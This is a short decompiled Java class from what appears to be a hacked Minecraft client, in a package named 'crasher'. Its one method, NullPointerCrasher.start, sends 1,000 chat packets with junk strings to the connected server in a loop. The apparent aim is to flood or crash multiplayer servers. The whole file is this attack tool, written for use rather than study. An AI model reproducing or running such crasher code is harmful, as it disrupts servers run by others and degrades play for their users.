// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketChatMessage;
import java.util.Random;
import net.minecraft.client.Minecraft;

public class NullPointerCrasher
{
    public static void start() {
        for (int i = 0; i < 1000; ++i) {
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketChatMessage(new Random().toString()));
        }
    }
}
